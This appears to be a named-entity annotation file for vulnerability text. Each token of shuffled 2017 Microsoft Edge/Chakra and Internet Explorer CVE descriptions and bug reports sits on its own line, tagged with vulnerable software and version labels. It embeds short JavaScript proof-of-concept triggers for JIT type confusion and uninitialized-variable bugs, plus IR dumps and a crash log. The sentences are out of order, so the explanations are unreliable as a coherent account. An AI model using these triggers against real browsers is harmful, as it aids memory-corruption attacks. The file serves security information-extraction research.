bailout O O
opcode O O
in O O
the O O
first O O
analysis O O
( O O
this- O O
> O O
IsLoopPrePass O O
( O O
) O O
is O O
satisfied O O
) O O
. O O

And O O
it O O
returns O O
false O O
in O O
the O O
second O O
analysis O O
. O O

if O O
( O O
valueType.CanBeTaggedValue O O
valueType.HasBeenNumber O O
this- O O
> O O
IsLoopPrePass O O
this- O O
> O O
currentBlock- O O
> O O
loop O O
) O O
) O O
{ O O
ValueType O O
newValueType O O
= O O
valueType.SetCanBeTaggedValue O O
( O O
false O O
) O O
; O O
Split O O
out O O
the O O
tag O O
check O O
as O O
a O O
separate O O
instruction O O
. O O

In O O
the O O
first O O
analysis O O
, O O
IsLoopPrePass O O
returns O O
true O O
. O O

PoC O O
: O O
function O O
opt O O
( O O
) O O
{ O O
let O O
obj O O
= O O
[ O O
2.3023e-320 O O
] O O
; O O
for O O
( O O
let O O
i O O
= O O
0 O O
; O O
i O O
< O O
1 O O
; O O
i++ O O
) O O
{ O O
obj.x O O
= O O
1 O O
; O O
In O O
the O O
first O O
analysis O O
, O O
BailOnNotObject O O
emitted O O
obj O O
= O O
+obj O O
; O O
Change O O
the O O
type O O
obj.x O O
= O O
1 O O
; O O
Type O O
confusion O O
} O O
} O O
function O O
main O O
( O O
) O O
{ O O
for O O
( O O
let O O
i O O
= O O
0 O O
; O O
i O O
< O O
1000 O O
; O O
i++ O O
) O O
{ O O
opt O O
main O O
( O O
) O O
; O O

IR O O
: O O
:Instr O O
bailOutInstr O O
; O O
bailOutInstr O O
= O O
IR O O
: O O
:BailOutInstr O O
: O O
:New O O
( O O
Js O O
: O O
:OpCode O O
: O O
:BailOnNotObject O O
, O O
IR O O
: O O
:BailOutOnTaggedValue O O
, O O
instr O O
, O O
instr- O O
> O O
m_func O O
The O O
JIT O O
compiler O O
analyzes O O
a O O
loop O O
twice O O
for O O
some O O
reasons O O
such O O
as O O
to O O
track O O
types O O
properly O O
. O O

But O O
the O O
return O O
value O O
of O O
valueType.HasBeenNumber O O
( O O
) O O
can O O
be O O
different O O
in O O
the O O
second O O
analysis O O
. O O

Microsoft O O
Edge O O
in O O
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
1709 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
and O O
Windows S-vulnerable_software pair_2
Server S-vulnerable_version pair_2
, O O
version S-vulnerable_version pair_2
1709 S-vulnerable_version pair_2
allows O O
an O O
attacker O O
to O O
take O O
control O O
of O O
an O O
affected O O
system O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11837 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11870 O O
, O O
CVE-2017-11871 O O
, O O
and O O
CVE-2017-11873 O O
. O O

But O O
the O O
problem O O
is O O
that O O
this O O
can O O
be O O
applied O O
to O O
constants O O
. O O

At O O
the O O
basic O O
block O O
( O O
a O O
) O O
, O O
the O O
type O O
of O O
o O O
is O O
always O O
Object O O
. O O

So O O
it O O
leads O O
to O O
type O O
confusion O O
at O O
the O O
basic O O
block O O
( O O
c O O
) O O
. O O

At O O
the O O
basic O O
block O O
( O O
b O O
) O O
, O O
the O O
type O O
of O O
o O O
is O O
always O O
CanBeTaggedValue_Float O O
. O O

All O O
blocks O O
will O O
treat O O
it O O
as O O
that O O
type O O
regardless O O
of O O
the O O
control O O
flow O O
. O O

The O O
bailouts O O
can O O
be O O
generated O O
when O O
inlining O O
JavaScript O O
functions O O
. O O

At O O
the O O
basic O O
block O O
( O O
c O O
) O O
, O O
it O O
combines O O
the O O
two O O
types O O
, O O
and O O
marks O O
the O O
type O O
of O O
o O O
as O O
CanBeTaggedValue_Mixed O O
( O O
Object O O
+ O O
CanBeTaggedValue_Float O O
) O O
. O O

This O O
means O O
, O O
once O O
a O O
constant O O
is O O
marked O O
as O O
some O O
type O O
in O O
a O O
certain O O
block O O
. O O

function O O
opt O O
( O O
inlinee O O
) O O
{ O O
inlinee O O
( O O
) O O
; O O
} O O
Generated O O
IR O O
code O O
for O O
the O O
above O O
code O O
: O O
StatementBoundary O O
0 O O
0000 O O
s6.var O O
= O O
StartCall O O
1 O O
( O O
0x1 O O
) O O
.i32 O O
0000 O O
BailOnNotObject O O
s3 O O
[ O O
LikelyCanBeTaggedValue_Object O O
] O O
.var O O
0006 O O
Bailout O O
: O O
0006 O O
( O O
BailOutOnInlineFunction O O
) O O
s10.var O O
= O O
Ld_A O O
[ O O
s3 O O
[ O O
LikelyObject O O
] O O
.var+8 O O
] O O
.u64 O O
0006 O O
BailOnNotEqual O O
[ O O
s10.var O O
! O O

] O O
.i32 O O
, O O
26 O O
( O O
0x1A O O
) O O
.i32 O O
Bailout O O
: O O
0006 O O
( O O
BailOutOnInlineFunction O O
) O O
BailOnNotEqual O O
[ O O
s3 O O
[ O O
LikelyObject O O
] O O
.var+40 O O
] O O
.u64 O O
, O O
0xXXXXXXXX O O
( O O
FunctionBody O O
[ O O
Anonymous O O
function O O
( O O
1.3 O O
) O O
, O O
4 O O
] O O
) O O
.u64 O O
Bailout O O
: O O
0006 O O
( O O
BailOutOnInlineFunction O O
) O O
As O O
you O O
can O O
see O O
after O O
the O O
BailOnNotObject O O
opcode O O
which O O
generates O O
BailOutOnTaggedValue O O
bailouts O O
, O O
the O O
type O O
of O O
s3 O O
becomes O O
LikelyObject O O
from O O
LikelyCanBeTaggedValue_Object O O
. O O

And O O
since O O
s2 O O
is O O
a O O
constant O O
, O O
that O O
change O O
affects O O
the O O
basic O O
block O O
( O O
c O O
) O O
. O O

Note O O
: O O
Just O O
Float O O
is O O
considered O O
an O O
Object O O
type O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11837 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11870 O O
, O O
CVE-2017-11871 O O
, O O
and O O
CVE-2017-11873 O O
. O O

ChakraCore O O
and O O
Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
and O O
Microsoft O O
Edge O O
and O O
Internet O O
Explorer O O
in O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
and O O
Windows S-vulnerable_software pair_7
Server S-vulnerable_version pair_7
, O O
version S-vulnerable_version pair_7
1709 S-vulnerable_version pair_7
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11836 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11870 O O
, O O
CVE-2017-11871 O O
, O O
and O O
CVE-2017-11873 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11837 O O
, O O
CVE-2017-11838 O O
, O O
CVE-2017-11839 O O
, O O
CVE-2017-11840 O O
, O O
CVE-2017-11841 O O
, O O
CVE-2017-11843 O O
, O O
CVE-2017-11846 O O
, O O
CVE-2017-11858 O O
, O O
CVE-2017-11859 O O
, O O
CVE-2017-11861 O O
, O O
CVE-2017-11862 O O
, O O
CVE-2017-11866 O O
, O O
CVE-2017-11869 O O
, O O
CVE-2017-11870 O O
, O O
CVE-2017-11871 O O
, O O
and O O
CVE-2017-11873 O O
. O O

ChakraCore O O
, O O
and O O
Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
1709 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
and O O
Windows S-vulnerable_software pair_2
Server S-vulnerable_version pair_2
, O O
version S-vulnerable_version pair_2
1709 S-vulnerable_version pair_2
allows O O
an O O
attacker O O
to O O
take O O
control O O
of O O
an O O
affected O O
system O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
and O O
Microsoft O O
Edge O O
and O O
Internet O O
Explorer O O
in O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
1709 S-vulnerable_version pair_5
, O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
and O O
Windows O O
Server O O
, O O
version O O
1709 O O
allows O O
an O O
attacker O O
to O O
gain O O
the O O
same O O
user O O
rights O O
as O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Microsoft O O
browsers O O
handle O O
objects O O
in O O
memory O O
, O O
aka O O
Microsoft O O
Browser O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11813 O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
SP2 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Internet O O
Explorer O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Internet O O
Explorer O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11822 O O
. O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
and O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
Internet O O
Explorer O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Internet O O
Explorer O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11792 O O
, O O
CVE-2017-11793 O O
, O O
CVE-2017-11796 O O
, O O
CVE-2017-11797 O O
, O O
CVE-2017-11798 O O
, O O
CVE-2017-11799 O O
, O O
CVE-2017-11800 O O
, O O
CVE-2017-11801 O O
, O O
CVE-2017-11802 O O
, O O
CVE-2017-11804 O O
, O O
CVE-2017-11805 O O
, O O
CVE-2017-11806 O O
, O O
CVE-2017-11807 O O
, O O
CVE-2017-11808 O O
, O O
CVE-2017-11809 O O
, O O
CVE-2017-11810 O O
, O O
CVE-2017-11812 O O
, O O
and O O
CVE-2017-11821 O O
. O O

ChakraCore O O
and O O
Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

ChakraCore O O
and O O
Microsoft O O
Edge O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
10 S-vulnerable_version pair_0
Gold S-vulnerable_version pair_0
, O O
1511 S-vulnerable_version pair_0
, O O
1607 S-vulnerable_version pair_0
, O O
1703 S-vulnerable_version pair_0
, O O
and O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2016 S-vulnerable_version pair_1
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

0017 O O
Line O O
4 O O
: O O
switch O O
( O O
i O O
) O O
{ O O
Col O O
9 O O
: O O
^ O O
StatementBoundary O O
3 O O
001a O O
s63 O O
( O O
s26 O O
) O O
.i32 O O
= O O
FromVar O O
s26 O O
[ O O
LikelyCanBeTaggedValue_Int_Number O O
] O O
.var O O
001a O O
Bailout O O
: O O
001a O O
( O O
BailOutExpectingInteger O O
) O O
BrLt_I4 O O
$ O O
L4 O O
, O O
s63 O O
( O O
s26 O O
) O O
.i32 O O
, O O
2 O O
( O O
0x2 O O
) O O
.i32 O O
0079 O O
BrGt_I4 O O
$ O O
L4 O O
, O O
s63 O O
( O O
s26 O O
) O O
.i32 O O
, O O
38 O O
( O O
0x26 O O
) O O
.i32 O O
0079 O O
MultiBr O O
... O O
, O O
s27 O O
[ O O
LikelyCanBeTaggedValue_Int O O
] O O
.var O O
0079 O O
It O O
ended O O
up O O
to O O
use O O
j O O
of O O
type O O
Var O O
as O O
the O O
offset O O
variable O O
. O O

In O O
the O O
above O O
code O O
, O O
s26 O O
is O O
ensured O O
to O O
be O O
of O O
type O O
Int32 O O
by O O
the O O
bailout O O
. O O

What O O
I O O
noticed O O
is O O
s28.var O O
= O O
Sub_A O O
s26.var O O
, O O
2 O O
( O O
0x2 O O
) O O
.i32 O O
. O O

So O O
, O O
the O O
other O O
variables O O
affected O O
by O O
s26 O O
including O O
the O O
offset O O
variable O O
s28 O O
are O O
also O O
ensured O O
to O O
be O O
of O O
type O O
Int32 O O
. O O

0079 O O
The O O
offset O O
variable O O
is O O
replaced O O
with O O
j O O
that O O
is O O
not O O
ensured O O
to O O
be O O
of O O
type O O
Int32 O O
. O O

MultiBr O O
... O O
, O O
s28.var O O
0070 O O
IRs O O
after O O
Type O O
Specialization O O
: O O
s52 O O
( O O
s26 O O
) O O
.i32 O O
= O O
Ld_A O O
s51 O O
( O O
s24 O O
) O O
.i32 O O
- O O
i O O
0011 O O
BrLt_I4 O O
$ O O
L2 O O
, O O
s51 O O
( O O
s24 O O
) O O
.i32 O O
, O O
2 O O
( O O
0x2 O O
) O O
.i32 O O
0070 O O
$ O O
L9 O O
: O O
0070 O O
BrGt_I4 O O
$ O O
L2 O O
, O O
s51 O O
( O O
s24 O O
) O O
.i32 O O
, O O
38 O O
( O O
0x26 O O
) O O
.i32 O O
0070 O O
$ O O
L8 O O
: O O
0070 O O
s53 O O
( O O
s28 O O
) O O
.i32 O O
= O O
Sub_I4 O O
s51 O O
( O O
s24 O O
) O O
.i32 O O
, O O
2 O O
( O O
0x2 O O
) O O
.i32 O O
0070 O O
MultiBr O O
... O O
, O O
s53 O O
( O O
s28 O O
) O O
.i32 O O
! O O

If O O
not O O
, O O
type O O
confusion O O
will O O
occur O O
. O O

It O O
was O O
bypassed O O
with O O
the O O
CSE O O
phase O O
. O O

CORRECTION O O
: O O
The O O
bug O O
was O O
that O O
it O O
tried O O
to O O
ensure O O
the O O
type O O
using O O
BailOutExpectingInteger O O
, O O
even O O
if O O
i O O
was O O
not O O
always O O
of O O
type O O
Int32 O O
. O O

If O O
we O O
declare O O
a O O
variable O O
j O O
with O O
i O O
- O O
2 O O
, O O
the O O
offset O O
variable O O
s28 O O
will O O
be O O
replaced O O
with O O
j O O
in O O
the O O
CSE O O
phase O O
. O O

Before O O
the O O
CSE O O
phase O O
: O O
Var O O
j O O
= O O
ToVar O O
( O O
i O O
- O O
2 O O
) O O
; O O
int32_t O O
offset O O
= O O
i O O
- O O
2 O O
; O O
jmp O O
jump_table O O
[ O O
offset O O
] O O
; O O
After O O
the O O
CSE O O
phase O O
: O O
Var O O
j O O
= O O
ToVar O O
( O O
i O O
- O O
2 O O
) O O
; O O
jmp O O
jump_table O O
[ O O
j O O
] O O
; O O
/ O O

The O O
way O O
to O O
ensure O O
it O O
is O O
to O O
use O O
BailOutExpectingInteger O O
. O O

Microsoft O O
Edge O O
Chakra O O
JIT O O
- O O
Type O O
Confusion O O
with O O
switch O O
Statements O O

Internet O O
Explorer O O
in O O
Microsoft S-vulnerable_software pair_0
Windows S-vulnerable_software pair_0
7 S-vulnerable_version pair_0
SP1 S-vulnerable_version pair_0
, O O
Windows S-vulnerable_software pair_1
Server S-vulnerable_version pair_1
2008 S-vulnerable_version pair_1
SP2 S-vulnerable_version pair_1
and S-vulnerable_version pair_1
R2 S-vulnerable_version pair_1
SP1 S-vulnerable_version pair_1
, O O
Windows S-vulnerable_software pair_2
8.1 S-vulnerable_version pair_2
and O O
Windows S-vulnerable_software pair_3
RT S-vulnerable_version pair_3
8.1 S-vulnerable_version pair_3
, O O
Windows S-vulnerable_software pair_4
Server S-vulnerable_version pair_4
2012 S-vulnerable_version pair_4
and S-vulnerable_version pair_4
R2 S-vulnerable_version pair_4
, O O
Windows S-vulnerable_software pair_5
10 S-vulnerable_version pair_5
Gold S-vulnerable_version pair_5
, O O
1511 S-vulnerable_version pair_5
, O O
1607 S-vulnerable_version pair_5
, O O
1703 S-vulnerable_version pair_5
, O O
and O O
Windows S-vulnerable_software pair_6
Server S-vulnerable_version pair_6
2016 S-vulnerable_version pair_6
allows O O
an O O
attacker O O
to O O
execute O O
arbitrary O O
code O O
in O O
the O O
context O O
of O O
the O O
current O O
user O O
, O O
due O O
to O O
how O O
the O O
scripting O O
engine O O
handles O O
objects O O
in O O
memory O O
, O O
aka O O
Scripting O O
Engine O O
Memory O O
Corruption O O
Vulnerability O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11792 O O
, O O
CVE-2017-11793 O O
, O O
CVE-2017-11796 O O
, O O
CVE-2017-11798 O O
, O O
CVE-2017-11799 O O
, O O
CVE-2017-11800 O O
, O O
CVE-2017-11801 O O
, O O
CVE-2017-11802 O O
, O O
CVE-2017-11804 O O
, O O
CVE-2017-11805 O O
, O O
CVE-2017-11806 O O
, O O
CVE-2017-11807 O O
, O O
CVE-2017-11808 O O
, O O
CVE-2017-11809 O O
, O O
CVE-2017-11811 O O
, O O
CVE-2017-11812 O O
, O O
and O O
CVE-2017-11821 O O
. O O

Later O O
, O O
when O O
AString O O
is O O
converted O O
to O O
the O O
BString O O
in O O
AString O O
: O O
:ConvertToBSTR O O
, O O
the O O
size O O
of O O
the O O
result O O
BString O O
could O O
be O O
calculated O O
incorrectly O O
which O O
can O O
lead O O
to O O
a O O
heap O O
overflow O O
. O O

( O O
The O O
PoC O O
above O O
crashes O O
in O O
memcpy O O
when O O
attempting O O
to O O
copy O O
a O O
large O O
amount O O
of O O
data O O
) O O
. O O

jscript.dll O O
is O O
an O O
old O O
JavaScript O O
library O O
that O O
was O O
used O O
in O O
IE O O
8 O O
and O O
back O O
. O O

However O O
, O O
IE O O
11 O O
can O O
still O O
load O O
it O O
if O O
put O O
into O O
IE O O
8 O O
compatibility O O
mode O O
and O O
if O O
there O O
is O O
a O O
script O O
tag O O
that O O
can O O
only O O
be O O
understood O O
by O O
the O O
older O O
library O O
( O O
specifically O O
, O O
a O O
script O O
tag O O
with O O
language= O O
Jscript.Encode O O
attribute O O
will O O
do O O
the O O
trick O O
) O O
. O O

eax=00000003 O O
ebx=00000006 O O
ecx=dcbabbb8 O O
edx=00000003 O O
esi=e6e8bb7f O O
edi=e900fb9b O O
eip=751c9a6c O O
esp=09dfbdfc O O
ebp=09dfbe04 O O
iopl=0 O O
nv O O
up O O
ei O O
ng O O
nz O O
na O O
pe O O
nc O O
cs=0023 O O
ss=002b O O
ds=002b O O
es=002b O O
fs=0053 O O
gs=002b O O
efl=00010286 O O
msvcrt O O
! O O
memcpy+0x270 O O
: O O
751c9a6c O O
8a4603 O O
mov O O
al O O
, O O
byte O O
ptr O O
[ O O
esi+3 O O
] O O
ds:002b O O
: O O
e6e8bb82= O O

Debug O O
log O O
: O O
( O O
10b8.1364 O O
) O O
: O O
Access O O
violation O O
- O O
code O O
c0000005 O O
( O O
first O O
chance O O
) O O
First O O
chance O O
exceptions O O
are O O
reported O O
before O O
any O O
exception O O
handling O O
. O O

Microsoft S-vulnerable_software pair_0
Internet S-vulnerable_software pair_0
Explorer S-vulnerable_software pair_0
11 S-vulnerable_version pair_0
- O O
jscript O O
! O O
JsErrorToString O O
Use-After-Free O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11792 O O
, O O
CVE-2017-11793 O O
, O O
CVE-2017-11796 O O
, O O
CVE-2017-11797 O O
, O O
CVE-2017-11798 O O
, O O
CVE-2017-11799 O O
, O O
CVE-2017-11800 O O
, O O
CVE-2017-11801 O O
, O O
CVE-2017-11802 O O
, O O
CVE-2017-11804 O O
, O O
CVE-2017-11805 O O
, O O
CVE-2017-11806 O O
, O O
CVE-2017-11807 O O
, O O
CVE-2017-11808 O O
, O O
CVE-2017-11810 O O
, O O
CVE-2017-11811 O O
, O O
CVE-2017-11812 O O
, O O
and O O
CVE-2017-11821 O O
. O O

But O O
at O O
( O O
a O O
) O O
, O O
if O O
it O O
fails O O
to O O
allocate O O
Js O O
: O O
:Constants O O
: O O
:MinStackInterpreter O O
bytes O O
to O O
the O O
stack O O
, O O
it O O
throws O O
an O O
exception O O
which O O
leads O O
to O O
the O O
following O O
code O O
. O O

In O O
the O O
PoC O O
, O O
the O O
variables O O
a O O
, O O
b O O
and O O
c O O
are O O
initialized O O
. O O

Js O O
: O O
:Var O O
Js O O
: O O
:InterpreterStackFrame O O
: O O
:INTERPRETERLOOPNAME O O
( O O
) O O
{ O O
PROBE_STACK O O
( O O
scriptContext O O
, O O
Js O O
: O O
:Constants O O
: O O
:MinStackInterpreter O O
) O O
; O O
( O O
a O O
) O O
if O O
( O O
! O O
this- O O
> O O
closureInitDone O O
) O O
{ O O
Assert O O
( O O
this- O O
> O O
m_reader.GetCurrentOffset O O
( O O
) O O
0 O O
) O O
; O O
this- O O
> O O
InitializeClosures O O
( O O
) O O
; O O
( O O
b O O
interprets O O
the O O
bytecode O O
... O O
At O O
( O O
b O O
) O O
, O O
it O O
initializes O O
the O O
local O O
variables O O
of O O
the O O
javascript O O
function O O
. O O

void O O
StackScriptFunction O O
: O O
:BoxState O O
: O O
:Box O O
if O O
( O O
callerFunctionBody- O O
> O O
DoStackScopeSlots O O
( O O
) O O
) O O
{ O O
Var O O
stackScopeSlots O O
= O O
( O O
Var O O
) O O
interpreterFrame- O O
> O O
GetLocalClosure O O
( O O
) O O
; O O
if O O
( O O
stackScopeSlots O O
) O O
{ O O
Var O O
boxedScopeSlots O O
= O O
this- O O
> O O
BoxScopeSlots O O
( O O
stackScopeSlots O O
, O O
ScopeSlots O O
( O O
stackScopeSlots O O
) O O
.GetCount O O
( O O
) O O
) O O
; O O
interpreterFrame- O O
> O O
SetLocalClosure O O
( O O
( O O
Var O O
) O O
boxedScopeSlots O O
stackScopeSlots O O
contains O O
the O O
local O O
variables O O
that O O
were O O
supposed O O
to O O
be O O
initialized O O
at O O
( O O
b O O
) O O
. O O

So O O
I O O
recommend O O
to O O
use O O
the O O
command O O
: O O
./Debug/ch O O
-NoNative O O
~/test.js O O
. O O

PoC O O
: O O
function O O
trigger O O
( O O
) O O
{ O O
let O O
a O O
, O O
b O O
, O O
c O O
; O O
function O O
g O O
( O O
) O O
{ O O
trigger O O
( O O
) O O
; O O
a O O
, O O
b O O
, O O
c O O
; O O
} O O
g O O
( O O
) O O
; O O
} O O
trigger O O
( O O
) O O
; O O

So O O
it O O
results O O
in O O
accessing O O
the O O
uninitialized O O
pointers O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11792 O O
, O O
CVE-2017-11793 O O
, O O
CVE-2017-11796 O O
, O O
CVE-2017-11797 O O
, O O
CVE-2017-11798 O O
, O O
CVE-2017-11799 O O
, O O
CVE-2017-11800 O O
, O O
CVE-2017-11801 O O
, O O
CVE-2017-11802 O O
, O O
CVE-2017-11804 O O
, O O
CVE-2017-11805 O O
, O O
CVE-2017-11806 O O
, O O
CVE-2017-11807 O O
, O O
CVE-2017-11809 O O
, O O
CVE-2017-11810 O O
, O O
CVE-2017-11811 O O
, O O
CVE-2017-11812 O O
, O O
and O O
CVE-2017-11821 O O
. O O

This O O
CVE O O
ID O O
is O O
unique O O
from O O
CVE-2017-11792 O O
, O O
CVE-2017-11793 O O
, O O
CVE-2017-11796 O O
, O O
CVE-2017-11797 O O
, O O
CVE-2017-11798 O O
, O O
CVE-2017-11799 O O
, O O
CVE-2017-11800 O O
, O O
CVE-2017-11801 O O
, O O
CVE-2017-11802 O O
, O O
CVE-2017-11804 O O
, O O
CVE-2017-11805 O O
, O O
CVE-2017-11806 O O
, O O
CVE-2017-11808 O O
, O O
CVE-2017-11809 O O
, O O
CVE-2017-11810 O O
, O O
CVE-2017-11811 O O
, O O
